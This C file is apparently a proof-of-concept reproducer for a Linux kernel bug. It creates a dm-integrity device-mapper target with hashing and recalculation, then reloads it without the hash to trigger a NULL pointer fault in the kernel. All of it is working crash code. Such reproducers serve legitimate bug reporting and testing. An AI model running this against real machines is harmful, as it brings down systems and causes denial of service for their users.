#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <linux/dm-ioctl.h>

#define DM_CONTROL "/dev/mapper/control"

static int ctl_fd = -1;

static int dm_ioctl(int cmd, struct dm_ioctl *dmi, size_t len)
{
	int r;
	memset((char *)dmi + sizeof(struct dm_ioctl), 0, len - sizeof(struct dm_ioctl));
	dmi->version[0] = 4;
	dmi->version[1] = 0;
	dmi->version[2] = 0;
	dmi->data_size = len;
	dmi->data_start = sizeof(struct dm_ioctl);
	r = ioctl(ctl_fd, cmd, dmi);
	if (r < 0)
		return -errno;
	return 0;
}

static int dm_create(const char *name)
{
	char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->flags = DM_PERSISTENT_DEV_FLAG;
	return dm_ioctl(DM_DEV_CREATE, dmi, sizeof(buf));
}

static int dm_remove(const char *name)
{
	char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	return dm_ioctl(DM_DEV_REMOVE, dmi, sizeof(buf));
}

static int dm_load(const char *name, const char *target_spec)
{
	char buf[8192];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;
	struct dm_target_spec *spec;
	char *p;
	size_t spec_len;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->target_count = 1;
	dmi->flags = DM_READONLY_FLAG;

	spec = (struct dm_target_spec *)(buf + sizeof(struct dm_ioctl));
	spec->sector_start = 0;
	spec->length = 1024;
	snprintf(spec->target_type, sizeof(spec->target_type), "integrity");

	p = (char *)spec + sizeof(struct dm_target_spec);
	strcpy(p, target_spec);
	spec_len = sizeof(struct dm_target_spec) + strlen(target_spec) + 1;
	spec_len = (spec_len + 7) & ~7UL;

	return dm_ioctl(DM_TABLE_LOAD, dmi, sizeof(struct dm_ioctl) + spec_len);
}

static int dm_suspend(const char *name, int do_suspend)
{
	char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->flags = do_suspend ? DM_SUSPEND_FLAG : 0;
	return dm_ioctl(DM_DEV_SUSPEND, dmi, sizeof(buf));
}

static void st(const char *tag, int rc)
{
	printf("%-40s rc=%d errno=%d\n", tag, rc, rc ? errno : 0);
	fflush(stdout);
}

static int read_file(const char *path, char *out, size_t n)
{
	int fd = open(path, O_RDONLY);
	ssize_t r;
	if (fd < 0)
		return -1;
	r = read(fd, out, n - 1);
	close(fd);
	if (r < 0)
		return -1;
	out[r] = 0;
	return 0;
}

int main(void)
{
	char sb_flags[64];
	int rc;

	setvbuf(stdout, NULL, _IONBF, 0);

	printf("=== DM_INTEGRITY RECALC_WQ NULL POC ===\n");
	printf("=== PHASE 1: create with internal_hash + recalculate ===\n");

	ctl_fd = open(DM_CONTROL, O_RDWR);
	if (ctl_fd < 0) {
		printf("open %s failed errno=%d\n", DM_CONTROL, errno);
		return 1;
	}
	printf("control fd=%d\n", ctl_fd);

	dm_remove("syzint0");
	rc = dm_create("syzint0");
	st("DM_DEV_CREATE", rc);

	rc = dm_load("syzint0",
		"ram0 0 16 J 1 journal_sectors:16 internal_hash:sha256 recalculate");
	st("DM_TABLE_LOAD (hash+recalculate)", rc);
	if (rc) {
		printf("load failed, aborting phase1\n");
		close(ctl_fd);
		return 1;
	}

	rc = dm_suspend("syzint0", 0);
	st("DM_DEV_SUSPEND resume", rc);

	sleep(1);

	printf("=== PHASE 2: reload without internal_hash ===\n");
	printf("=== sb has SB_FLAG_RECALCULATING, recalc_wq not created ===\n");

	dm_suspend("syzint0", 1);
	st("DM_DEV_SUSPEND suspend", 0);

	rc = dm_load("syzint0", "ram0 0 16 J 1 journal_sectors:16");
	st("DM_TABLE_LOAD (no hash)", rc);

	rc = dm_suspend("syzint0", 0);
	st("DM_DEV_SUSPEND resume (expect GPF)", rc);

	printf("=== survived, check dmesg ===\n");

	dm_remove("syzint0");
	close(ctl_fd);
	printf("=== POC DONE ===\n");
	return 0;
}